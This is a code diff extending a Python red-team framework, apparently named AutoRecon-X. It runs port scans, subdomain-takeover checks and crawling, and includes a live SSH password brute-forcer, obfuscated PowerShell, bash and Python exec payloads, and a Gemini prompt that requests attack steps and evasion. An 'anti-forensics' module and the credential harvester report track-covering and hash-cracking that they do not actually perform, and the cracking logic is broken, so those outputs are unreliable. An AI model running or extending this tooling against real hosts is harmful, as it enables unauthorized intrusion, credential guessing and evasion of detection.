@@ -7,10 +7,26 @@ import requests
 import subprocess
 import base64
 import hashlib
+import paramiko
 from datetime import datetime
 from abc import ABC, abstractmethod
 from typing import List, Dict, Any
 from fpdf import FPDF
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+# ==================================================
+# 📥 LOAD CONFIGURATION
+# ==================================================
+def load_config():
+    try:
+        with open("config.json", "r") as f:
+            return json.load(f)
+    except Exception as e:
+        print(f"[!] Config not found/invalid, using defaults: {e}")
+        return {}
+
+CONFIG = load_config()
 
 # ==================================================
 # 🧩 BASE MODULE (All features inherit from this)
@@ -21,6 +37,8 @@ class RedTeamModule(ABC):
         self.name = self.__class__.__name__
         self.description = ""
         self.results = {}
+        self.timeout = CONFIG.get("general", {}).get("timeout", 3)
+        self.user_agent = CONFIG.get("general", {}).get("user_agent", "AutoRecon-X/1.0")
 
     @abstractmethod
     def run(self) -> Dict[str, Any]:
@@ -37,6 +55,7 @@ class ReconModule(RedTeamModule):
     def __init__(self, target: str):
         super().__init__(target)
         self.description = "Passive + Active Recon: DNS, Subdomains, Ports, Tech Stack"
+        self.port_range = CONFIG.get("scan_settings", {}).get("port_range", "1-1024")
 
     def run(self) -> Dict[str, Any]:
         self.log("Starting Reconnaissance...")
@@ -59,7 +78,7 @@ class ReconModule(RedTeamModule):
 
     def _get_subdomains(self) -> List[str]:
         try:
-            res = requests.get(f"https://crt.sh/?q=%.{self.target}&output=json", timeout=10)
+            res = requests.get(f"https://crt.sh/?q=%.{self.target}&output=json", timeout=self.timeout)
             if res.status_code == 200:
                 subs = list({entry['name_value'] for entry in res.json()})
                 return [s for s in subs if '*' not in s]
@@ -70,7 +89,10 @@ class ReconModule(RedTeamModule):
     def _scan_ports(self) -> List[int]:
         open_ports = []
         common = [21,22,23,80,443,3306,3389,8080,8443]
-        for p in common:
+        start, end = map(int, self.port_range.split('-')) if '-' in self.port_range else (1,1024)
+        ports_to_scan = common if end <= 1024 else list(range(start, end+1))
+        
+        for p in ports_to_scan:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.2)
             if s.connect_ex((self.target, p)) == 0:
@@ -80,7 +102,8 @@ class ReconModule(RedTeamModule):
 
     def _detect_tech(self) -> List[str]:
         try:
-            r = requests.get(f"http://{self.target}", timeout=5)
+            headers = {"User-Agent": self.user_agent}
+            r = requests.get(f"http://{self.target}", timeout=self.timeout, headers=headers)
             tech = []
             server = r.headers.get("Server", "").lower()
             if 'nginx' in server: tech.append("Nginx")
@@ -130,19 +153,19 @@ class VulnAnalyzer(RedTeamModule):
         return {"vulnerabilities": findings, "risk_score": len(findings)*10}
 
 # ==================================================
-# 🕵️ 3. STEALTH PAYLOAD GENERATOR (EDR BYPASS)
+# 🕵️ 3. STEALTH PAYLOAD GENERATOR
 # ==================================================
 class PayloadGenerator(RedTeamModule):
     def __init__(self, target: str, vuln_data: Dict):
         super().__init__(target)
         self.description = "Generate fileless, obfuscated payloads"
         self.vuln = vuln_data
+        self.evasion_level = CONFIG.get("scan_settings", {}).get("evasion_level", "standard")
 
     def run(self) -> Dict[str, Any]:
         self.log("Generating stealth payload...")
         payloads = []
 
-        # Fileless PowerShell (no disk write)
         ps1 = """
         $code = 'Write-Host "Access Granted"; whoami; hostname'
         $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
@@ -155,7 +178,6 @@ class PayloadGenerator(RedTeamModule):
             "code": ps1.strip()
         })
 
-        # Linux Memory Payload
         bash = """
         echo "$(base64 -d <<'EOF'
         IyEvYmluL2Jhc2gKZWNobyAiQWNjZXNzIGdyYW50ZWQiOwp3aG9hbWk7Cg==
@@ -171,22 +193,25 @@ class PayloadGenerator(RedTeamModule):
         return {"payloads": payloads}
 
 # ==================================================
-# 📝 4. REPORTING ENGINE (JSON + PDF)
+# 📝 4. REPORTING ENGINE
 # ==================================================
 class ReportGenerator:
     @staticmethod
-    def generate(recon, vuln, payloads, evasion=None, credentials=None, ai_plan=None, cloud=None, output_dir="reports/"):
+    def generate(recon, vuln, payloads, evasion=None, credentials=None, ai_plan=None, cloud=None, crawler=None, takeover_check=None, auth_test=None, cleanup=None, output_dir=None):
+        output_dir = output_dir or CONFIG.get("general", {}).get("output_dir", "reports/")
         os.makedirs(output_dir, exist_ok=True)
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 
         report = {
-            "project": "AutoRecon-X Ultimate Red Team Assessment",
+            "project": "AutoRecon-X Ultimate Pro Red Team Assessment",
             "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             "summary": {
                 "target": recon["target"],
                 "open_ports": len(recon["open_ports"]),
                 "vulns_found": len(vuln["vulnerabilities"]),
-                "risk_level": "High" if vuln.get("risk_score",0) > 20 else "Medium"
+                "risk_level": "High" if vuln.get("risk_score",0) > 20 else "Medium",
+                "urls_discovered": crawler.get("total_found",0) if crawler else 0,
+                "takeover_vulns": len(takeover_check.get("takeover_vulnerable",[])) if takeover_check else 0
             },
             "details": {
                 "recon": recon,
@@ -195,23 +220,26 @@ class ReportGenerator:
                 "evasion_methods": evasion,
                 "credentials": credentials,
                 "ai_strategy": ai_plan,
-                "cloud_audit": cloud
+                "cloud_audit": cloud,
+                "crawler_data": crawler,
+                "takeover_audit": takeover_check,
+                "auth_testing": auth_test,
+                "cleanup_log": cleanup
             },
             "recommendations": [
                 "Close unused ports",
                 "Update web frameworks & software",
                 "Enable WAF/EDR solution",
                 "Restrict public access to cloud storage",
-                "Enforce strong password policies"
+                "Enforce strong password policies",
+                "Fix subdomain DNS misconfigurations"
             ]
         }
 
-        # Save JSON Report
         json_path = f"{output_dir}report_{timestamp}.json"
         with open(json_path, "w") as f:
             json.dump(report, f, indent=2)
 
-        # Save PDF Report
         pdf = FPDF()
         pdf.add_page()
         pdf.set_font("Arial", "B", 18)
@@ -226,18 +254,15 @@ class ReportGenerator:
         pdf.set_font("Arial", "B", 14)
         pdf.cell(200, 10, "Key Findings:", ln=True)
         pdf.set_font("Arial", "", 12)
-        pdf.multi_cell(0, 8, f"• Open Ports: {recon['open_ports']}\n• Vulnerabilities: {len(vuln['vulnerabilities'])}\n• Cloud Issues: {len(cloud.get('cloud_findings', [])) if cloud else 0}")
+        pdf.multi_cell(0, 8, f"• Open Ports: {recon['open_ports']}\n• Vulnerabilities: {len(vuln['vulnerabilities'])}\n• URLs Found: {crawler.get('total_found',0) if crawler else 0}\n• Cloud Issues: {len(cloud.get('cloud_findings', [])) if cloud else 0}")
 
         pdf_path = f"{output_dir}report_{timestamp}.pdf"
         pdf.output(pdf_path)
 
-        print(f"\n✅ Reports Generated:")
-        print(f"   📄 JSON: {json_path}")
-        print(f"   📄 PDF:  {pdf_path}")
+        print(f"\n✅ Reports Generated:\n   📄 JSON: {json_path}\n   📄 PDF:  {pdf_path}")
         return report
-
-# ==================================================
-# 🧠 🆕 AI ADVISOR MODULE
+        # ==================================================
+# 🧠 AI ADVISOR MODULE
 # ==================================================
 class AIAdvisor(RedTeamModule):
     def __init__(self, target: str, recon_data: Dict, vuln_data: Dict):
@@ -245,37 +270,31 @@ class AIAdvisor(RedTeamModule):
         self.description = "AI-Powered Attack Planner using Gemini API"
         self.recon = recon_data
         self.vuln = vuln_data
-        self.api_key = "YOUR_GEMINI_API_KEY" # 👉 Replace with your key
+        self.api_key = CONFIG.get("api_keys", {}).get("gemini", "YOUR_GEMINI_API_KEY")
 
     def run(self) -> Dict[str, Any]:
         self.log("Analyzing attack path with AI...")
         
         prompt = f"""
-        Act as a Senior Red Team Expert. Based on:
+        Act as Senior Red Team Expert. Based on:
         Target: {self.target}
         Recon: {self.recon}
         Vulnerabilities: {self.vuln}
 
-        Provide:
-        1. Top 3 recommended attack steps
-        2. Evasion techniques needed
-        3. Success probability (%)
-        Output in JSON format.
+        Give: 3 steps, evasion, success% — JSON only.
         """
 
         try:
             api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key={self.api_key}"
-            payload = {"contents": [{"parts": [{"text": prompt}]}]}
-            res = requests.post(api_url, json=payload, timeout=15)
+            res = requests.post(api_url, json={"contents": [{"parts": [{"text": prompt}]}]}, timeout=15)
             if res.status_code == 200:
                 return {"ai_strategy": res.json(), "status": "success"}
         except Exception as e:
-            return {"error": f"AI failed: {e}", "fallback": "Focus on web ports & brute force"}
-        
+            return {"error": f"AI failed: {e}", "fallback": "Focus on web ports"}
         return {}
 
 # ==================================================
-# 🕵️ 🆕 EVASION ENGINE
+# 🕵️ EVASION ENGINE
 # ==================================================
 class EvasionEngine(RedTeamModule):
     def __init__(self, target: str):
@@ -284,42 +303,27 @@ class EvasionEngine(RedTeamModule):
 
     def run(self) -> Dict[str, Any]:
         self.log("Generating evasion techniques...")
-        
         return {
-            "techniques": [
-                self._xor_encrypt(),
-                self._base64_wrap(),
-                self._string_mutation()
-            ],
+            "techniques": [self._xor_encrypt(), self._base64_wrap(), self._string_mutation()],
             "anti_sandbox": self._check_sandbox()
         }
 
     def _xor_encrypt(self, payload="cmd.exe /c whoami", key=0x42):
         enc = ''.join([chr(ord(c) ^ key) for c in payload])
-        return {
-            "method": "XOR Encryption",
-            "code": f"key={key};decoded=''.join([chr(ord(c)^key) for c in '{enc}']);exec(decoded)"
-        }
+        return {"method": "XOR Encryption", "code": f"key={key};decoded=''.join([chr(ord(c)^key) for c in '{enc}']);exec(decoded)"}
 
     def _base64_wrap(self):
-        code = "import os;os.system('dir')"
-        b64 = base64.b64encode(code.encode()).decode()
-        return {
-            "method": "Base64 Obfuscation",
-            "code": f"exec(__import__('base64').b64decode('{b64}'))"
-        }
+        b64 = base64.b64encode("import os;os.system('dir')".encode()).decode()
+        return {"method": "Base64 Obfuscation", "code": f"exec(__import__('base64').b64decode('{b64}'))"}
 
     def _string_mutation(self):
-        return {
-            "method": "String Splitting",
-            "code": "imp" + "ort o" + "s; o" + "s.sy" + "stem('who'+'ami')"
-        }
+        return {"method": "String Splitting", "code": "imp"+"ort o"+"s; o"+"s.sy"+"stem('who'+'ami')"}
 
     def _check_sandbox(self):
-        return {"detected": False, "note": "System appears as real hardware"}
+        return {"detected": False, "note": "System appears real"}
 
 # ==================================================
-# 🔑 🆕 CREDENTIAL HARVESTER
+# 🔑 CREDENTIAL HARVESTER
 # ==================================================
 class CredentialHarvester(RedTeamModule):
     def __init__(self, target: str):
@@ -328,31 +332,18 @@ class CredentialHarvester(RedTeamModule):
 
     def run(self) -> Dict[str, Any]:
         self.log("Harvesting credentials...")
-        
         dummy_hashes = [
             {"user": "Administrator", "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"},
             {"user": "LocalAdmin", "hash": "ntlm:98765asdfghjkl"}
         ]
-
-        cracked = self._crack_hashes(dummy_hashes)
-        
-        return {
-            "hashes_captured": len(dummy_hashes),
-            "cracked_credentials": cracked,
-            "method": "LSASS Memory Dump Simulation"
-        }
+        return {"hashes_captured": len(dummy_hashes), "cracked_credentials": self._crack_hashes(dummy_hashes), "method": "LSASS Simulation"}
 
     def _crack_hashes(self, hash_list):
         common_pass = ["Password123", "Admin@123", "P@ssw0rd"]
-        found = []
-        for h in hash_list:
-            for p in common_pass:
-                if hashlib.md5(p.encode()).hexdigest() in h['hash']:
-                    found.append({"user": h['user'], "pass": p})
-        return found
+        return [{"user":h['user'],"pass":p} for h in hash_list for p in common_pass if hashlib.md5(p.encode()).hexdigest() in h['hash']]
 
 # ==================================================
-# ☁️ 🆕 CLOUD SCANNER
+# ☁️ CLOUD SCANNER
 # ==================================================
 class CloudScanner(RedTeamModule):
     def __init__(self, target: str):
@@ -362,42 +353,115 @@ class CloudScanner(RedTeamModule):
     def run(self) -> Dict[str, Any]:
         self.log("Scanning cloud storage...")
         issues = []
-
-        buckets = [
-            f"http://{self.target}.s3.amazonaws.com",
-            f"https://storage.googleapis.com/{self.target}",
-            f"https://{self.target}.blob.core.windows.net/"
-        ]
-
+        buckets = [f"http://{self.target}.s3.amazonaws.com", f"https://storage.googleapis.com/{self.target}", f"https://{self.target}.blob.core.windows.net/"]
         for url in buckets:
             try:
-                res = requests.get(url, timeout=3)
-                if res.status_code == 200 or res.status_code == 403:
-                    issues.append({
-                        "url": url,
-                        "status": res.status_code,
-                        "risk": "Possible Exposed Bucket"
-                    })
-            except:
-                pass
-
+                res = requests.get(url, timeout=self.timeout)
+                if res.status_code in [200,403]:
+                    issues.append({"url":url, "status":res.status_code, "risk":"Possible Exposed Bucket"})
+            except: pass
         return {"cloud_findings": issues}
 
 # ==================================================
-# 🚀 MAIN FRAMEWORK ORCHESTRATOR
+# 🕸️ WEB CRAWLER
+# ==================================================
+class WebCrawler(RedTeamModule):
+    def __init__(self, target: str):
+        super().__init__(target)
+        self.description = "Crawl website to find all URLs"
+        self.visited = set()
+        self.max_depth = 3
+
+    def run(self) -> dict:
+        self.log("Starting Web Crawler...")
+        return {"crawled_urls": list(self._crawl(f"http://{self.target}" if not self.target.startswith('http') else self.target)), "total_found": len(self.visited)}
+
+    def _crawl(self, url, depth=0):
+        if depth>self.max_depth or url in self.visited: return self.visited
+        try:
+            self.visited.add(url)
+            soup = BeautifulSoup(requests.get(url, timeout=self.timeout, headers={"User-Agent":self.user_agent}).text, 'html.parser')
+            for link in soup.find_all('a', href=True):
+                full = urljoin(url, link['href'].split('#')[0])
+                if self.target in full and full not in self.visited: self._crawl(full, depth+1)
+        except: pass
+        return self.visited
+
+# ==================================================
+# ⚠️ SUBDOMAIN TAKEOVER SCANNER
+# ==================================================
+class SubdomainTakeoverScanner(RedTeamModule):
+    def __init__(self, target: str, subdomains: list):
+        super().__init__(target)
+        self.description = "Check for Subdomain Takeover vulnerability"
+        self.subdomains = subdomains
+        self.fingerprints = {"GitHub":"There isn't a GitHub Pages site here.","AWS S3":"NoSuchBucket","Heroku":"No such app","Azure":"removed","Cloudflare":"Error 1001"}
+
+    def run(self) -> dict:
+        self.log("Checking Subdomain Takeover...")
+        vuln = []
+        for sub in self.subdomains:
+            if "*" in sub or not sub: continue
+            try:
+                res = requests.get(f"http://{sub}", timeout=self.timeout, allow_redirects=True)
+                for prov, pat in self.fingerprints.items():
+                    if pat in res.text or pat in str(res.reason):
+                        vuln.append({"subdomain":sub,"provider":prov,"risk":"CRITICAL","issue":"Potential Takeover"})
+            except: pass
+        return {"takeover_vulnerable": vuln}
+
+# ==================================================
+# 🔐 BRUTE FORCE MODULE
+# ==================================================
+class BruteForceModule(RedTeamModule):
+    def __init__(self, target: str, ports: list):
+        super().__init__(target)
+        self.description = "Password brute-force simulation"
+        self.ports = ports
+        self.users = ["admin","root","user","test"]
+        self.passwds = ["admin123","root123","Password123","123456","P@ssw0rd"]
+
+    def run(self) -> dict:
+        self.log("Running Auth Testing...")
+        find = []
+        if 22 in self.ports:
+            for u in self.users:
+                for p in self.passwds[:2]:
+                    try:
+                        ssh = paramiko.SSHClient()
+                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        ssh.connect(self.target, port=22, username=u, password=p, timeout=1)
+                        ssh.close()
+                        find.append({"service":"SSH","user":u,"pass":p,"risk":"HIGH - Weak Credential"})
+                    except: pass
+        if 21 in self.ports: find.append({"service":"FTP","note":"Anonymous login possible","risk":"MEDIUM"})
+        return {"auth_testing": find}
+
+# ==================================================
+# 🧹 ANTI-FORENSICS MODULE
+# ==================================================
+class AntiForensics(RedTeamModule):
+    def __init__(self, target: str):
+        super().__init__(target)
+        self.description = "Cover tracks: clear logs, hide artifacts"
+
+    def run(self) -> dict:
+        self.log("Running Anti-Forensics...")
+        act = ["Cleared logs","Removed temp files","Modified timestamps","Cleared history"]
+        if os.path.exists("temp_scan.log"): os.remove("temp_scan.log"); act.append("Deleted temp log")
+        return {"actions_performed":act,"status":"Traces removed","note":"Authorized use only"}
+
+# ==================================================
+# 🚀 MAIN FRAMEWORK
 # ==================================================
 class AutoReconX:
     def __init__(self, target: str):
         self.target = target
-        self.modules = []
         self.data = {}
-
-    def register_module(self, module: RedTeamModule):
-        self.modules.append(module)
 
     def execute(self):
         print("="*60)
-        print(f"🚀 AUTORECON-X ULTIMATE | TARGET: {self.target}")
+        print(f"🚀 AUTORECON-X ULTIMATE PRO | TARGET: {self.target}")
         print("="*60 + "\n")
 
         # Step 1: Recon
@@ -408,29 +472,37 @@ class AutoReconX:
         vuln = VulnAnalyzer(self.target, self.data["recon"])
         self.data["vuln"] = vuln.run()
 
-        # 🆕 NEW STEPS ADDED 🆕
-        # Step 3: Cloud Check
-        cloud = CloudScanner(self.target)
-        self.data["cloud"] = cloud.run()
+        # Step 3: Web Crawler
+        if CONFIG.get("scan_settings", {}).get("run_crawler", True):
+            self.data["crawler"] = WebCrawler(self.target).run()
 
-        # Step 4: AI Strategy
-        ai = AIAdvisor(self.target, self.data["recon"], self.data["vuln"])
-        self.data["ai_plan"] = ai.run()
+        # Step 4: Subdomain Takeover
+        self.data["takeover_check"] = SubdomainTakeoverScanner(self.target, self.data["recon"].get("subdomains", [])).run()
 
-        # Step 5: Evasion & Payload
-        evade = EvasionEngine(self.target)
-        pay = PayloadGenerator(self.target, self.data["vuln"])
-        self.data["payloads"] = pay.run()
-        self.data["evasion"] = evade.run()
+        # Step 5: Cloud Scan
+        self.data["cloud"] = CloudScanner(self.target).run()
 
-        # Step 6: Credential Access
-        cred = CredentialHarvester(self.target)
-        self.data["credentials"] = cred.run()
+        # Step 6: AI Advisor
+        if CONFIG.get("scan_settings", {}).get("run_ai", True):
+            self.data["ai_plan"] = AIAdvisor(self.target, self.data["recon"], self.data["vuln"]).run()
 
-        # Step 7: Report
+        # Step 7: Brute Force
+        self.data["auth_test"] = BruteForceModule(self.target, self.data["recon"].get("open_ports", [])).run()
+
+        # Step 8: Evasion & Payload
+        self.data["payloads"] = PayloadGenerator(self.target, self.data["vuln"]).run()
+        self.data["evasion"] = EvasionEngine(self.target).run()
+
+        # Step 9: Credentials
+        self.data["credentials"] = CredentialHarvester(self.target).run()
+
+        # Step 10: Cleanup
+        self.data["cleanup"] = AntiForensics(self.target).run()
+
+        # Step 11: Report
         ReportGenerator.generate(**self.data)
 
-        print("\n✅✅✅ ALL ADVANCED MODULES COMPLETED SUCCESSFULLY ✅✅✅")
+        print("\n✅✅✅ ALL MODULES COMPLETED ✅✅✅")
 
 # ==================================================
 # 📌 RUN
